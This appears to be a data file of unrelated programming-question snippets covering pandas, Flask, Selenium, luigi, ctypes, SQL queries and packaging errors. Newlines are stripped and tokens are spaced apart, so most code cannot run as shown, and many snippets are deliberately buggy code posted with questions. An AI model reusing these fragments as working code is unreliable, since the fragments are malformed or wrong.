> > > import xml.etree.ElementTree as etree > > > xml = etree.fromstring ( `` < a > < b > < c > xy < /c > < /b > < /a > '' ) > > > etree.tostring ( xml.find ( ' b ' ) ) ' < b > < c > xy < /c > < /b > ' > > > xml.find ( ' b ' ) == NoneFalse > > > bool ( xml.find ( ' b ' ) ) True > > > etree.tostring ( xml.find ( ' b/c ' ) ) ' < c > xy < /c > ' > > > xml.find ( ' b/c ' ) == NoneFalse > > > bool ( xml.find ( ' b/c ' ) ) False > > > leaf = xml.find ( ' b/c ' ) : > > > if leaf : > > > do_stuff ( leaf )
"import mysql.connectorfrom datetime import timedeltafrom datetime import datetimeshow_DB = `` '' '' select RUID , test_sname , test_value , units , ref_range , entry_date from % s where RUID= % % s and test_sname= % % s order by RUID , test_sname , entry_date Limit 5 ; '' '' '' % ( tableToUse , ) cursor.execute ( show_DB , ( ruid , traitPair [ 0 ] ) ) resultsForOneTrait = cursor.fetchall ( ) for result in resultsForOneTrait : ruid = result [ 0 ] s_name = result [ 1 ] .decode ( `` UTF-8 '' ) value = result [ 2 ] units = result [ 3 ] .decode ( `` UTF-8 '' ) ref_range = result [ 4 ] .decode ( `` UTF-8 '' ) # Need assistance here entryDate = result [ 5 ] record = BloodTraitRecord ( ruid , s_name , value , units , ref_range , entryDate ) class BloodTraitRecord : def __init__ ( self , ruid , test_sname , test_value , units , ref_range , entry_date ) : self.RUID = ruid self.test_sname = test_sname self.test_value = test_value self.units = units self.ref_range = ref_range self.entry_date = entry_date '2008-11-14 13:28:00 ' '2014-05-18 00:00:00 ' # 'cancerCutoff ' is consistently a datetime.date cancerCutoff = firstCancerAnemiaCodeDate [ ruidkey ] - timedelta ( days=180 ) if cancerCutoff < record.entry_date.date ( ) : AttributeError : 'datetime.date ' object has no attribute 'date ' '2014-05-18 '"
0 1 2 3 4 Sum_max_30 591949 2575703 22479693 2202865 499835 272582611 2705 11426 339913 5438 1016 3567772 18 119 4162 18 0 42993 264 1213 14999 246 116 164764 0 35 1292 10 0 13375 0 0 1442 0 0 14426 0 28 5596 20 0 56447 0 10 102 56 0 1688 33 0 1224 17 0 12749 39 198 9505 62 35 9765
"import pandas as pdimport numpy as npdf = pd.DataFrame ( { `` x '' : np.random.normal ( size=100 ) , `` y '' : np.random.normal ( size=100 ) } ) df % > % mutate ( z = x * y , w = z + 10 ) df.assign ( z = df.x * df.y , w = z + 10 ) # Errordf.assign ( z = df.x * df.y , w = lambda d : d.z + 10 ) # Error df.assign ( z = df.x * df.y ) .assign ( w = lambda d : d.z + 10 )"
"from selenium.webdriver import PhantomJSfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditionsdriver = PhantomJS ( ) wait = WebDriverWait ( driver , 10 ) driver.get ( url ) while True : // scrap the page try : driver.find_elements_by_css_selector ( '.next ' ) [ 0 ] .click ( ) except : break wait.until ( expected_conditions.visibility_of_element_located ( ( By.CSS_SELECTOR , '.loading ' ) ) ) wait.until ( expected_conditions.invisibility_of_element_located ( ( By.CSS_SELECTOR , '.loading ' ) ) ) driver.quit ( )"
@ app.before_requestdef before_request ( ) : `` Session time out method '' flask.session.permanent = True app.permanent_session_lifetime = datetime.timedelta ( minutes=2 ) flask.session.modified = True flask.g.user = flask_login.current_user # return redirect ( url_for ( 'login ' ) ) @ mod.before_requestdef make_session_permanent ( ) : if session_is_invalid ( session ) : return redirect ( url_for ( 'logout ' ) ) def session_is_invalid ( ses ) : # return your qualifier
"df lbound rbound x0 -1 1 01 5 7 12 0 1 2 df [ 'area ' ] = np.where ( df [ ' x ' ] > df [ 'rbound ' ] , 'right ' , 'somewhere else ' ) df lbound rbound x area0 -1 1 0 middle1 5 7 1 left2 0 1 2 right"
"def guess_the_number ( ) : number = random.randrange ( 20 ) guessesMade = 0 print ( 'Take a guess ' ) guess = input ( ) guess = int ( guess ) while guessesMade < 6 : if guess < number : print ( 'Your guess is too low . ' ) if guess > number : print ( 'Your guess is too high . ' ) if guess == number : break if guess == number : print'You got it in ' , guessesMade , 'guess ( es ) ! Congratulaions ! ' else : print ' I\ 'm sorry , the number was ' , number"
"values : 2 , 1 , 2 , 3lengths : 3 , 2 , 2 , 4"
"minute tradePrice Data 0 1 10 Total Result 12548 Sum - tradeVolume 3 3 Count - tradePrice 2 2 12548.5 Sum - tradeVolume 1 1 Count - tradePrice 1 1 12549 Sum - tradeVolume 1 1 Count - tradePrice 1 1 12549.5 Sum - tradeVolume 95 95 Count - tradePrice 5 5 12550 Sum - tradeVolume 6 6 Count - tradePrice 4 4 12559 Sum - tradeVolume 93 93 Count - tradePrice 1 1 12559.5 Sum - tradeVolume 1 1 Count - tradePrice 1 1 12560 Sum - tradeVolume 5 5 Count - tradePrice 4 4 12560.5 Sum - tradeVolume 3 5 8 Count - tradePrice 3 2 5 12561 Sum - tradeVolume 4 5 9 Count - tradePrice 2 3 5 12561.5 Sum - tradeVolume 3 2 5 Count - tradePrice 3 1 4 12562 Sum - tradeVolume 9 7 16 Count - tradePrice 8 1 9 12562.5 Sum - tradeVolume 6 2 8 Count - tradePrice 2 2 4 12563 Sum - tradeVolume 2 2 Count - tradePrice 1 1 Total Sum - tradeVolume 120 27 106 253 Total Count - tradePrice 20 14 13 47 Price Volume02:00:00 AM 12559 9302:01:00 AM 12562 702:10:00 AM 12549.5 95 def f ( x ) : # function to find the POC price and volume a = x [ 'tradePrice ' ] .value_counts ( ) .index [ 0 ] b = x.loc [ x [ 'tradePrice ' ] == a , 'tradeVolume ' ] .sum ( ) return pd.Series ( [ a , b ] , [ 'POC_Price ' , 'POC_Volume ' ] ) groupbytime = ( str ( Time ) + '' min '' ) # ther is a column name by thisgroups = df.groupby ( groupbytime , as_index=True ) df_POC = groups.apply ( f ) # applys the function of the POC on the grouped data Price Volume02:10:00 AM 12549.5 95 dateTime tradePrice tradeVolume 1min time_of_day_10 time_of_day_30 date hour minute0 2017-09-19 02:00:04 12559 93 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 049 2017-09-19 02:00:11 12562 1 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 050 2017-09-19 02:00:12 12563 2 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 051 2017-09-19 02:00:12 12562 1 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0122 2017-09-19 02:00:34 12561.5 1 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0123 2017-09-19 02:00:34 12562 1 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0127 2017-09-19 02:00:34 12562 1 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0129 2017-09-19 02:00:35 12561 2 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0130 2017-09-19 02:00:35 12560.5 1 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0131 2017-09-19 02:00:35 12561.5 1 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0135 2017-09-19 02:00:39 12562 1 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0136 2017-09-19 02:00:39 12562 1 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0137 2017-09-19 02:00:43 12561.5 1 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0138 2017-09-19 02:00:43 12561 2 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0139 2017-09-19 02:00:43 12560.5 1 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0140 2017-09-19 02:00:43 12560.5 1 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0152 2017-09-19 02:00:45 12562 2 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0153 2017-09-19 02:00:46 12562.5 4 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0166 2017-09-19 02:00:58 12562 1 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0167 2017-09-19 02:00:58 12562.5 2 2017-09-19 02:00:00 02:00:00 02:00:00 2017-09-19 2 0168 2017-09-19 02:01:00 12562 7 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1169 2017-09-19 02:01:00 12562.5 1 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1170 2017-09-19 02:01:00 12562.5 1 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1171 2017-09-19 02:01:00 12561.5 2 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1175 2017-09-19 02:01:03 12561 1 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1176 2017-09-19 02:01:03 12561 3 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1187 2017-09-19 02:01:07 12560.5 2 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1188 2017-09-19 02:01:08 12561 1 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1189 2017-09-19 02:01:10 12560 1 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1190 2017-09-19 02:01:10 12560 1 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1191 2017-09-19 02:01:10 12559.5 1 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1192 2017-09-19 02:01:11 12560 1 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1193 2017-09-19 02:01:12 12560 2 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1194 2017-09-19 02:01:12 12560.5 3 2017-09-19 02:01:00 02:00:00 02:00:00 2017-09-19 2 1593 2017-09-19 02:10:00 12550 1 2017-09-19 02:10:00 02:10:00 02:00:00 2017-09-19 2 10594 2017-09-19 02:10:00 12549.5 12 2017-09-19 02:10:00 02:10:00 02:00:00 2017-09-19 2 10604 2017-09-19 02:10:12 12548.5 1 2017-09-19 02:10:00 02:10:00 02:00:00 2017-09-19 2 10605 2017-09-19 02:10:15 12549.5 22 2017-09-19 02:10:00 02:10:00 02:00:00 2017-09-19 2 10606 2017-09-19 02:10:16 12549.5 21 2017-09-19 02:10:00 02:10:00 02:00:00 2017-09-19 2 10636 2017-09-19 02:10:45 12548 1 2017-09-19 02:10:00 02:10:00 02:00:00 2017-09-19 2 10637 2017-09-19 02:10:47 12548 2 2017-09-19 02:10:00 02:10:00 02:00:00 2017-09-19 2 10638 2017-09-19 02:10:47 12549.5 23 2017-09-19 02:10:00 02:10:00 02:00:00 2017-09-19 2 10639 2017-09-19 02:10:48 12549.5 17 2017-09-19 02:10:00 02:10:00 02:00:00 2017-09-19 2 10640 2017-09-19 02:10:49 12549 1 2017-09-19 02:10:00 02:10:00 02:00:00 2017-09-19 2 10665 2017-09-19 02:10:58 12550 1 2017-09-19 02:10:00 02:10:00 02:00:00 2017-09-19 2 10666 2017-09-19 02:10:58 12550 1 2017-09-19 02:10:00 02:10:00 02:00:00 2017-09-19 2 10667 2017-09-19 02:10:58 12550 3 2017-09-19 02:10:00 02:10:00 02:00:00 2017-09-19 2 10"
"from itertools import chaindef foo ( n ) : for i in range ( n ) : yield [ i , i**2 ] chain ( *foo ( 5 ) ) chain.from_iterable ( foo ( 5 ) )"
"def generateSearchIndizes ( radius ) : for i in range ( 1 , radius + 1 ) : yield i yield -i for i in generateSearchIndizes ( ) : if pred ( myList [ baseIndex + i ] ) : result = myList [ baseIndex + i ] break # terminate search when first item is found"
"SELECT LT.SomeID , LT.weekID , W.monday , GREATEST ( LT.attr1 , LT.attr2 ) FROM LargeTable LT JOIN Week W ON LT.weekID = W.ID ORDER BY LT.someID ASC , LT.weekID ASC ; import fileinput INPUT_PATH = 'path/to/csv/dump/dump.csv ' event_list = [ ] ID = -1 for line in fileinput.input ( [ INPUT_PATH ] ) : split_line = line.split ( ' ; ' ) if split_line [ 0 ] == ID : event_list.append ( split_line [ 1 : ] ) else : process_function ( ID , event_list ) event_list = [ split_line [ 1 : ] ] ID = split_line [ 0 ] process_function ( ID , event_list ) import MySQLdb ... opening connection , defining SScursor called ssc ... CHUNK_SIZE = 100000 query_stmt = `` '' '' SELECT LT.SomeID , LT.weekID , W.monday , GREATEST ( LT.attr1 , LT.attr2 ) FROM LargeTable LT JOIN Week W ON LT.weekID = W.ID ORDER BY LT.someID ASC , LT.weekID ASC '' '' '' ssc.execute ( query_stmt ) event_list = [ ] ID = -1 data_chunk = ssc.fetchmany ( CHUNK_SIZE ) while data_chunk : for row in data_chunk : if row [ 0 ] == ID : event_list.append ( [ row [ 1 ] , row [ 2 ] , row [ 3 ] ] ) else : process_function ( ID , event_list ) event_list = [ [ row [ 1 ] , row [ 2 ] , row [ 3 ] ] ] ID = row [ 0 ] data_chunk = ssc.fetchmany ( CHUNK_SIZE ) process_function ( ID , event_list )"
"image = cv.imread ( `` meme 2.jpg '' ) hsv = cv.cvtColor ( image , cv.COLOR_BGR2HSV ) # Define lower and uppper limits of what we call `` white-ish '' sensitivity = 19lower_white = np.array ( [ 0 , 0 , 255 - sensitivity ] ) upper_white = np.array ( [ 255 , sensitivity , 255 ] ) # Mask image to only select whitemask = cv.inRange ( hsv , lower_white , upper_white ) # Change image to grey where we found brownimage [ mask > 0 ] = ( 170 , 170 , 170 ) cv.imwrite ( file , image )"
$ tree -d | grep -v `` __pycache__ '' .├── src│ ├── poliastro│ │ ├── iod│ │ ├── tests│ │ └── twobody│ │ └── tests├── setup.py└── MANIFEST.in47 directories $ tree -d | grep -v `` __pycache__ '' .├── build│ ├── lib│ │ └── poliastro│ │ ├── iod│ │ ├── tests│ │ └── twobody
"In [ 47 ] : df = pd.DataFrame ( [ 'group9class1 ' , 'group10class2 ' , 'group11class20 ' ] , columns= [ 'group_class ' ] ) In [ 48 ] : split_locations = df.group_class.str.rfind ( 'class ' ) In [ 49 ] : split_locationsOut [ 49 ] : 0 61 72 7dtype : int64In [ 50 ] : dfOut [ 50 ] : group_class0 group9class11 group10class22 group11class20 group_class group class0 group9class1 group9 class11 group10class2 group10 class22 group11class20 group11 class20 In [ 56 ] : df.group_class.str [ : split_locations ] Out [ 56 ] : 0 NaN1 NaN2 NaN"
"var = [ 0 ] .extend ( range ( 1,10 ) )"
"self.msg = { `` attachments '' : [ { `` fallback '' : `` % s , % s '' % ( self.jiraIssueObj.fields.summary , self.link ) , `` pretext '' : `` Detail summary for % s '' % self.jiraIssueObj , `` title '' : self.jiraIssueObj.fields.summary , `` title_link '' : self.link , `` text '' : self.jiraIssueObj.fields.description [ 0 : self.maxSummary ] , `` color '' : `` # 7CD197 '' , `` mrkdwn_in '' : [ `` text '' , `` pretext '' , `` fields '' ] } ] } def Send ( self ) : if ( self.msg ) : slack_client.api_call ( `` chat.postMessage '' , channel=self.channel , text=self.msg , as_user=True ) self.msg = None"
"> > > x = y = 0 > > > id ( 0 ) 4297074752 > > > id ( x ) 4297074752 > > > id ( y ) 4297074752 > > > x += 1 > > > id ( x ) 4297074728 > > > y0 > > > N = id ( 0 ) > > > for i in range ( 5 ) : ... print i , N - id ( i ) ... 0 01 242 483 724 96 > > > bin ( 24 ) '0b11000 ' > > > prev = 0 > > > for i in range ( 270 ) : ... t = ( id ( i-1 ) , id ( i ) ) ... diff = t [ 0 ] - t [ 1 ] ... if diff ! = prev : ... print i-1 , i , t , diff ... prev = diff ... -1 0 ( 4297074776 , 4297074752 ) 2435 36 ( 4297073912 , 4297075864 ) -195236 37 ( 4297075864 , 4297075840 ) 2476 77 ( 4297074904 , 4297076856 ) -195277 78 ( 4297076856 , 4297076832 ) 24117 118 ( 4297075896 , 4297077848 ) -1952118 119 ( 4297077848 , 4297077824 ) 24158 159 ( 4297076888 , 4297078840 ) -1952159 160 ( 4297078840 , 4297078816 ) 24199 200 ( 4297077880 , 4297079832 ) -1952200 201 ( 4297079832 , 4297079808 ) 24240 241 ( 4297078872 , 4297080824 ) -1952241 242 ( 4297080824 , 4297080800 ) 24256 257 ( 4297080464 , 4297155264 ) -74800257 258 ( 4297155072 , 4297155288 ) -216259 260 ( 4297155072 , 4297155336 ) -264260 261 ( 4297155048 , 4297155432 ) -384261 262 ( 4297155024 , 4297155456 ) -432262 263 ( 4297380280 , 4297155384 ) 224896263 264 ( 4297155000 , 4297155240 ) -240264 265 ( 4297155072 , 4297155216 ) -144266 267 ( 4297155072 , 4297155168 ) -96267 268 ( 4297155024 , 4297155144 ) -120 # define NSMALLPOSINTS 257 # define NSMALLNEGINTS 5"
"def letter ( row , col ) : if row > col : return 'T ' else : return ' W ' WWWWWWWWWWWWWWWWWWWWTWWWWWWWWWWWWWWWWWWWTTWWWWWWWWWWWWWWWWWWTTTWWWWWWWWWWWWWWWWWTTTTWWWWWWWWWWWWWWWWTTTTTWWWWWWWWWWWWWWWTTTTTTWWWWWWWWWWWWWWTTTTTTTWWWWWWWWWWWWWTTTTTTTTWWWWWWWWWWWWTTTTTTTTTWWWWWWWWWWWTTTTTTTTTTWWWWWWWWWWTTTTTTTTTTTWWWWWWWWWTTTTTTTTTTTTWWWWWWWWTTTTTTTTTTTTTWWWWWWWTTTTTTTTTTTTTTWWWWWWTTTTTTTTTTTTTTTWWWWWTTTTTTTTTTTTTTTTWWWWTTTTTTTTTTTTTTTTTWWWTTTTTTTTTTTTTTTTTTWWTTTTTTTTTTTTTTTTTTTW XOOOOOXOXOOOXOOOXOXOOOOOXOOOOOXOXOOOXOOOXOXOOOOOX"
"class Command ( BaseCommand ) : def handle ( self , *args , **options ) ... .code unique to colors def check_validity ( self , color ) ... . # code common to both shades and colors class Command ( BaseCommand ) : def handle ( self , *args , **options ) ... . # code unique to shades def check_validity ( self , color ) ... . # code common to both shades and colors"
"import randomimport luigiimport timeimport osclass TaskNode ( luigi.Task ) : i = luigi.IntParameter ( ) # node ID def __init__ ( self , *args , **kwargs ) : super ( ) .__init__ ( *args , **kwargs ) self.required = [ ] def set_required ( self , required=None ) : self.required = required # set the dependencies return self def requires ( self ) : return self.required def output ( self ) : return luigi.LocalTarget ( ' { 0 } { 1 } .txt'.format ( self.__class__.__name__ , self.i ) ) def run ( self ) : with self.output ( ) .open ( ' w ' ) as outfile : outfile.write ( 'inside { 0 } { 1 } \n'.format ( self.__class__.__name__ , self.i ) ) self.process ( ) def process ( self ) : raise NotImplementedError ( self.__class__.__name__ + `` must implement this method '' ) class FastNode ( TaskNode ) : def process ( self ) : time.sleep ( 1 ) class SlowNode ( TaskNode ) : def process ( self ) : time.sleep ( 2 ) # This WrapperTask builds all the nodes class All ( luigi.WrapperTask ) : def __init__ ( self , *args , **kwargs ) : super ( ) .__init__ ( *args , **kwargs ) num_nodes = 513 classes = TaskNode.__subclasses__ ( ) self.nodes = [ ] for i in reversed ( range ( num_nodes ) ) : cls = random.choice ( classes ) dependencies = random.sample ( self.nodes , ( num_nodes - i ) // 35 ) obj = cls ( i=i ) if dependencies : obj.set_required ( required=dependencies ) else : obj.set_required ( required=None ) # delete existing output causing a build all if obj.output ( ) .exists ( ) : obj.output ( ) .remove ( ) self.nodes.append ( obj ) def requires ( self ) : return self.nodesif __name__ == '__main__ ' : luigi.run ( )"
df [ df [ 'side ' ] == 'Sell ' ] [ 'quantity ' ] = df [ df [ 'side ' ] == 'Sell ' ] [ 'quantity ' ] * -1
"users ( id , name ) organizations ( id , name ) organization_user ( id , organization_id , user_id , is_active ) class OrganizationSchema ( ma.ModelSchema ) : members_list = fields.Nested ( OrgnizationUserSchema , many=True , exclude= ( 'checklist ' , ) ) class OrgnizationUserSchema ( ma.ModelSchema ) : user_list = fields.Nested ( UserSchema ) organization_schema = OrganizationSchema ( many=True ) # Query for list of organizationorganization_list = Organization.query.all ( ) organization_schema.dump ( organization_list ) [ { 'id ' : 1 , 'name ' : 'abc ' , 'members_list ' : [ { 'id':1 , 'organization_id ' : 1 , 'user_id':1 , 'is_active ' : True } , { 'id':1 , 'organization_id ' : 1 , 'user_id':2 , 'is_active ' : False } ] } ] [ { 'id ' : 1 , 'name ' : 'abc ' , 'members_list ' : [ { 'id':1 , 'organization_id ' : 1 , 'user_id':1 , 'is_active ' : True } ] } ]"
"if __name__ == '__main__ ' : tc = int ( input ( ) .strip ( ) ) for i_tc in range ( tc ) : n = int ( input ( ) .strip ( ) ) while n % 2 == 0 and n is not 0 : n > > = 1 last = 0 for i in range ( 3 , int ( n ** 0.5 ) , 2 ) : while n % i == 0 and n > 0 : last = n n = n // i # Concentrate here print ( n if n > 2 else last ) if __name__ == '__main__ ' : tc = int ( input ( ) .strip ( ) ) for i_tc in range ( tc ) : n = int ( input ( ) .strip ( ) ) while n % 2 == 0 and n is not 0 : n > > = 1 last = 0 for i in range ( 3 , int ( n ** 0.5 ) , 2 ) : while n % i == 0 and n > 0 : last = n n = n / i # Notice this is not // print ( n if n > 2 else last )"
"from django.utils.translation import ugettext_lazy as _class Product ( Model ) : # translation for model and set db table name class Meta : verbose_name = _ ( 'product ' ) verbose_name_plural = _ ( 'products ' ) ... class Model ( DjangoModel ) : class Meta : abstract = True def get_description ( self ) : return ungettext ( self.verbose_name , self.verbose_name_plural , self.count ) % \ { 'count ' : self.count , 'name ' : self.name } msgid `` % s product '' msgid_plural `` % s products '' msgstr [ 0 ] `` % s 1 výrobek '' msgstr [ 1 ] `` % s 2 výrobky '' msgstr [ 2 ] `` % s 5 výrobků '' `` Plural-Forms : nplurals=3 ; plural= ( ( n==1 ) ? 0 : ( n > =2 & & n < =4 ) ? 1 : 2 ) ; \n ''"
"algo ( range ( 1 , 8 ) , 3 ) - > [ [ 1,2,3 ] , [ 4,5 ] , [ 6,7 ] ] algo ( range ( 1 , 6 ) , 4 ) - > [ [ 1,2 ] , [ 3 ] , [ 4 ] , [ 5 ] ] algo ( range ( 1 , 12 ) , 5 ) - > [ [ 1,2,3 ] , [ 4,5 ] , [ 6,7 ] , [ 8,9 ] , [ 10 , 11 ] ] def split_up ( l , n ) : q , r = divmod ( len ( l ) , n ) def division_point ( i ) : return i * q + min ( i , r ) return [ l [ division_point ( i ) : division_point ( i+1 ) ] for i in range ( n ) ]"
"n=1j=0A = [ 1,2,3 ] B = [ None ] *len ( A ) while j < =n : for i in range ( 0 , len ( A ) ) : B [ i ] = A [ -1+i ] j=j+1print ( B )"
"( lm_1b ) adamg : lm_1b adamg $ pip install https : //github.com/kpu/kenlm/archive/master.zipCollecting https : //github.com/kpu/kenlm/archive/master.zip Cache entry deserialization failed , entry ignored Downloading https : //github.com/kpu/kenlm/archive/master.zip - 4.4MB 51.1MB/sInstalling collected packages : kenlm Running setup.py install for kenlm ... error Complete output from command /Users/adamg/anaconda2/envs/lm_1b/bin/python -u -c `` import setuptools , tokenize ; __file__='/private/var/folders/2l/hd8b8vx566ld71lfd8hjglbc0000gn/T/pip-9yzty3hd-build/setup.py ' ; f=getattr ( tokenize , 'open ' , open ) ( __file__ ) ; code=f.read ( ) .replace ( '\r\n ' , '\n ' ) ; f.close ( ) ; exec ( compile ( code , __file__ , 'exec ' ) ) '' install -- record /var/folders/2l/hd8b8vx566ld71lfd8hjglbc0000gn/T/pip-aff_d2b8-record/install-record.txt -- single-version-externally-managed -- compile : running install running build running build_ext building 'kenlm ' extension creating build creating build/temp.macosx-10.9-x86_64-3.6 creating build/temp.macosx-10.9-x86_64-3.6/util creating build/temp.macosx-10.9-x86_64-3.6/lm creating build/temp.macosx-10.9-x86_64-3.6/util/double-conversion creating build/temp.macosx-10.9-x86_64-3.6/python clang -Wno-unused-result -Wsign-compare -Wunreachable-code -DNDEBUG -g -fwrapv -O3 -Wall -Wstrict-prototypes -I/Users/adamg/anaconda2/envs/lm_1b/include -arch x86_64 -I/Users/adamg/anaconda2/envs/lm_1b/include -arch x86_64 -I . -I/Users/adamg/anaconda2/envs/lm_1b/include/python3.6m -c util/pool.cc -o build/temp.macosx-10.9-x86_64-3.6/util/pool.o -O3 -DNDEBUG -DKENLM_MAX_ORDER=6 -std=c++11 In file included from util/pool.cc:1 : In file included from ./util/pool.hh:4 : /Users/adamg/anaconda2/envs/lm_1b/bin/../include/c++/v1/cassert:21:10 : fatal error : 'assert.h ' file not found # include < assert.h > ^~~~~~~~~~ 1 error generated . error : command 'clang ' failed with exit status 1 -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Command `` /Users/adamg/anaconda2/envs/lm_1b/bin/python -u -c `` import setuptools , tokenize ; __file__='/private/var/folders/2l/hd8b8vx566ld71lfd8hjglbc0000gn/T/pip-9yzty3hd-build/setup.py ' ; f=getattr ( tokenize , 'open ' , open ) ( __file__ ) ; code=f.read ( ) .replace ( '\r\n ' , '\n ' ) ; f.close ( ) ; exec ( compile ( code , __file__ , 'exec ' ) ) '' install -- record /var/folders/2l/hd8b8vx566ld71lfd8hjglbc0000gn/T/pip-aff_d2b8-record/install-record.txt -- single-version-externally-managed -- compile '' failed with error code 1 in /private/var/folders/2l/hd8b8vx566ld71lfd8hjglbc0000gn/T/pip-9yzty3hd-build/"
"if sys.hexversion < 0x02060000 : raise RuntimeError ( 'This package requires Python 2.6 or later , try foo 0.1.7 ' )"
"from ctypes import *class struct_statvfs ( Structure ) : _fields_ = [ ( 'f_bsize ' , c_ulong ) , ( 'f_frsize ' , c_ulong ) , ( 'f_blocks ' , c_ulong ) , ( 'f_bfree ' , c_ulong ) , ( 'f_bavail ' , c_ulong ) , ( 'f_files ' , c_ulong ) , ( 'f_ffree ' , c_ulong ) , ( 'f_favail ' , c_ulong ) , ( 'f_fsid ' , c_ulong ) , ( 'f_flag ' , c_ulong ) , ( 'f_namemax ' , c_ulong ) , ] libc = CDLL ( 'libc.so.6 ' ) libc.statvfs.argtypes = [ c_char_p , POINTER ( struct_statvfs ) ] s = struct_statvfs ( ) res = libc.statvfs ( '/etc ' , byref ( s ) ) print 'return = % d , f_bsize = % d , f_blocks = % d , f_bfree = % d ' % ( res , s.f_bsize , s.f_blocks , s.f_bfree ) return = 0 , f_bsize = 4096 , f_blocks = 10079070 , f_bfree = 5048834*** glibc detected *** python : free ( ) : invalid next size ( fast ) : 0x0000000001e51780 ****** glibc detected *** python : malloc ( ) : memory corruption ( fast ) : 0x0000000001e517e0 ***"
"for src , dst in ( [ s , d ] for s in universe for d in universe if s ! = d ) : for src , dst in itertools.product ( universe , universe ) : if src ! = dst :"
"import ossource_dir_path = r 'd : \data'list_of_directories = os.listdir ( source_dir_path ) creation_times = { } for d in list_of_directories : creation_times [ d ] = os.path.getctime ( os.path.join ( source_dir_path , d ) ) from win32file import CreateFile , SetFileTime , GetFileTime , CloseHandlefrom win32file import GENERIC_READ , GENERIC_WRITE , OPEN_EXISTINGfrom pywintypes import Timedestination_dir_path = r ' f : \data ' # list_of_directories = os.listdir ( source_dir_path ) for d in creation_times : fh = CreateFile ( os.path.join ( destination_dir_path , d ) , 0 , 0 , None , OPEN_EXISTING , 0,0 ) SetFileTime ( fh , creation_times [ d ] )"
UPC Unit_Sales Price Price_Change Date 0 22 15 1.99 NaN 2017-10-10 1 22 7 2.19 True 2017-10-12 2 22 6 2.19 NaN 2017-10-13 3 22 7 1.99 True 2017-10-16 4 22 4 1.99 NaN 2017-10-17 5 35 15 3.99 NaN 2017-10-09 6 35 17 3.99 NaN 2017-10-11 7 35 5 4.29 True 2017-10-13 8 35 8 4.29 NaN 2017-10-15 9 35 2 4.29 NaN 2017-10-15 UPC Unit_Sales Price Price_Change Date Reaction 0 22 15 1.99 NaN 2017-10-10 NaN 1 22 7 2.19 True 2017-10-12 13 2 22 6 2.19 NaN 2017-10-13 NaN 3 22 7 1.99 True 2017-10-16 11 4 22 4 1.99 NaN 2017-10-19 NaN 5 35 15 3.99 NaN 2017-10-09 NaN 6 35 17 3.99 NaN 2017-10-11 NaN 7 35 5 4.29 True 2017-10-13 15 8 35 8 4.29 NaN 2017-10-15 NaN 9 35 2 4.29 NaN 2017-10-18 NaN x = df.loc [ df [ 'Price_Change ' ] == 'True ' ] for x in df : df [ 'Reaction ' ] = sum ( df.Unit_Sales [ 1day :8days ] )
"addons : apt : sources : - travis-ci/sqlite3 packages : - sqlite3 Disallowing sources : travis-ci/sqlite3To add unlisted APT sources , follow instructions in https : //docs.travis-ci.com/user/installing-dependencies # Installing-Packages-with-the-APT-Addon before_install : - sudo apt-add-repository -y ppa : travis-ci/sqlite3 - sudo apt-get -y update - sudo apt-get -y install sqlite3=3.7.15.1-1~travis1 Can not add PPA : 'ppa : travis-ci/sqlite3'.Please check that the PPA name or format is correct ."
python setup.py sdist upload -r testpypi [ ... ] running uploadSubmitting dist/ < package_name > to https : //test.pypi.org/legacyUpload failed ( 404 ) : Not Founderror : Upload failed ( 404 ) : Not Found [ distutils ] index-servers = pypi testpypi [ pypi ] repository : https : //pypi.python.org/pypiusername : your_usernamepassword : your_password [ testpypi ] repository : https : //test.pypi.org/legacyusername : pbaranaypassword : my_password
"A = 1001B = 0011C = 0110 00110110011110011011110111101111 1001 = the start1011 = ( 1001 + 1 ) | 10011101 = ( 1011 + 1 ) | 10011111 = ( 1101 + 1 ) | 1001 ( this is the last value as we have reached our mask ) MASK = 0x3FFFFFFFdef count_anded_bitmasks ( A , B , C ) : andSets = set ( enumerate_all_subsets ( A ) + enumerate_all_subsets ( B ) + enumerate_all_subsets ( C ) ) return len ( andSets ) def enumerate_all_subsets ( d ) : andSet = [ ] n = d while n ! = MASK : andSet.append ( n ) n = ( n + 1 ) | d andSet.append ( n ) return andSet 1001101111011111 0011011110111111 0110011111101111"
